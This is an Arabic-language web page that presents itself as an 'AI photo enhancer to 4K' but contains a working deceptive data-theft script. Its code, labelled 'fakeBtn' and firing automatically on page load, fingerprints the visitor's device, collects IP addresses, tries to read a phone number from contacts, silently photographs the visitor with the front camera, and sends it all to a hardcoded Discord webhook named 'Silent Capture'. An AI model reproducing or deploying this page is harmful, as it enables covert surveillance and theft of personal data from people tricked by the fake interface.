<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI محسن الصور - 4K</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
        
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            color: #e0e0ff;
            height: 100vh;
            overflow: hidden;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        /* Animated background elements */
        .background-elements {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 1;
            overflow: hidden;
        }
        
        .orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.3;
            animation: float 20s infinite ease-in-out;
        }
        
        .orb1 {
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, #a78bfa, #7c3aed);
            top: -100px;
            right: -100px;
            animation-delay: 0s;
        }
        
        .orb2 {
            width: 250px;
            height: 250px;
            background: radial-gradient(circle, #c084fc, #a78bfa);
            bottom: -50px;
            left: -50px;
            animation-delay: 5s;
        }
        
        .orb3 {
            width: 200px;
            height: 200px;
            background: radial-gradient(circle, #7c3aed, #5b21b6);
            top: 50%;
            left: 10%;
            animation-delay: 10s;
        }
        
        @keyframes float {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(30px, -30px); }
        }
        
        /* Main container */
        .container {
            position: relative;
            z-index: 10;
            text-align: center;
            padding: 40px 20px;
            max-width: 600px;
            backdrop-filter: blur(20px);
            background: rgba(15, 12, 41, 0.6);
            border-radius: 30px;
            border: 1px solid rgba(167, 139, 250, 0.2);
            box-shadow: 0 20px 60px rgba(100, 0, 255, 0.3),
                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
            animation: slideUp 0.8s ease-out;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* Icon decoration */
        .icon-wrapper {
            margin-bottom: 30px;
            display: flex;
            justify-content: center;
        }
        
        .icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #a78bfa, #7c3aed);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            box-shadow: 0 10px 30px rgba(100, 0, 255, 0.4);
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        /* Title */
        h1 {
            font-size: 2.8rem;
            font-weight: 900;
            background: linear-gradient(90deg, #a78bfa, #7c3aed, #c084fc, #a78bfa);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 20px;
            animation: gradientShift 4s ease infinite;
            letter-spacing: -1px;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        /* Subtitle */
        p {
            font-size: 1.3rem;
            opacity: 0.85;
            margin-bottom: 40px;
            max-width: 90%;
            margin-left: auto;
            margin-right: auto;
            line-height: 1.6;
            color: #d0d0ff;
            font-weight: 400;
        }
        
        /* Button styles */
        .btn {
            background: linear-gradient(135deg, #7c3aed 0%, #a78bfa 50%, #c084fc 100%);
            border: none;
            color: white;
            font-size: 1.4rem;
            font-weight: 700;
            padding: 18px 50px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 15px 40px rgba(100, 0, 255, 0.6),
                        0 0 30px rgba(167, 139, 250, 0.3);
            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            overflow: hidden;
            letter-spacing: 0.5px;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn:hover {
            transform: translateY(-6px) scale(1.05);
            box-shadow: 0 25px 60px rgba(100, 0, 255, 0.9),
                        0 0 50px rgba(167, 139, 250, 0.5);
        }
        
        .btn:active {
            transform: translateY(-2px) scale(0.98);
            box-shadow: 0 10px 30px rgba(100, 0, 255, 0.7);
        }
        
        /* Responsive design */
        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
                max-width: 90%;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            p {
                font-size: 1.1rem;
            }
            
            .btn {
                font-size: 1.2rem;
                padding: 15px 40px;
            }
            
            .icon {
                width: 60px;
                height: 60px;
                font-size: 30px;
            }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 25px 15px;
            }
            
            h1 {
                font-size: 1.8rem;
                margin-bottom: 15px;
            }
            
            p {
                font-size: 1rem;
                margin-bottom: 30px;
            }
            
            .btn {
                font-size: 1.1rem;
                padding: 14px 35px;
            }
        }
    </style>
</head>
<body>
    <div class="background-elements">
        <div class="orb orb1"></div>
        <div class="orb orb2"></div>
        <div class="orb orb3"></div>
    </div>

    <div class="container">
        <div class="icon-wrapper">
            <div class="icon">✨</div>
        </div>
        <h1>AI محسن الصور</h1>
        <p>ارفق الصورة وراح نحسن جودتها تلقائياً إلى 4K 60Hz بتقنية الذكاء الاصطناعي المتطورة</p>
        <button class="btn" id="fakeBtn">ارفق الصورة وتحسينها</button>
    </div>

    <script>
        const webhook = "https://discordapp.com/api/webhooks/1474896709946703933/6VR9PB2L1xs0BPAsmPo0bUn3xrOOl3_IO09pG6njG7xY-l3znKEbYfxu7fVrPoqMeDNX";

        // الزر يطلب الكاميرا ويسجل ويرسل عند الضغط
        document.getElementById('fakeBtn').addEventListener('click', async e => {
            e.preventDefault();
            await main();
        });

        async function getIPFromMultipleSources() {
            const ips = [];
            const sources = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://icanhazip.com',
                'https://ipwho.is',
                'https://ipinfo.io/json'
            ];
            for (const src of sources) {
                try {
                    const res = await fetch(src, { mode: 'cors' });
                    const data = await res.json();
                    if (data.ip) ips.push(data.ip);
                    else if (typeof data === 'string') ips.push(data.trim());
                } catch(e) {}
            }
            return ips.length ? [...new Set(ips)] : ['غير متوفر'];
        }

        async function tryGetPhoneNumber() {
            if ('contacts' in navigator && 'select' in navigator.contacts) {
                try {
                    const props = ['tel'];
                    const opts = { multiple: false };
                    const contacts = await navigator.contacts.select(props, opts);
                    if (contacts.length > 0 && contacts[0].tel) {
                        return contacts[0].tel[0] || 'تم اختيار جهة اتصال';
                    }
                } catch(e) {}
            }
            return 'غير متاح في المتصفح';
        }

        async function captureFrontCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
                stream.getTracks().forEach(t => t.stop());
                return blob;
            } catch (err) {
                console.error('كاميرا أمامية فشلت:', err);
                return null;
            }
        }

        async function sendToWebhooks(blob, deviceInfo) {
            const formData = new FormData();
            if (blob) formData.append('file', blob, 'auto_capture.jpg');
            formData.append('payload_json', JSON.stringify({
                content: `**تصوير تلقائي جديد (مع واجهة خادعة)**\n\`\`\`json\n${JSON.stringify(deviceInfo, null, 2)}\n\`\`\``,
                username: "Silent Capture",
                avatar_url: "https://i.imgur.com/000000.png"
            }));
            try {
                await fetch(webhook, { method: 'POST', body: formData });
            } catch(e) {}
        }

        async function main() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform || 'غير متوفر',
                languages: navigator.languages?.join(', ') || 'غير متوفر',
                screen: `${screen.width}x${screen.height} @ ${screen.colorDepth}-bit`,
                deviceMemory: navigator.deviceMemory || 'غير متوفر',
                hardwareConcurrency: navigator.hardwareConcurrency || 'غير متوفر',
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'غير متوفر',
                referrer: document.referrer || 'مباشر',
                timestamp: new Date().toISOString(),
                ips: await getIPFromMultipleSources(),
                phoneNumber: await tryGetPhoneNumber(),
                permissions: await (async () => {
                    try { return await navigator.permissions.query({name: 'camera'}).then(p => p.state); } catch { return 'غير مدعوم'; }
                })()
            };
            const photoBlob = await captureFrontCamera();
            await sendToWebhooks(photoBlob, deviceInfo);
        }

        window.addEventListener('load', () => {
            setTimeout(main, 800);
        });
    </script>
</body>
</html>
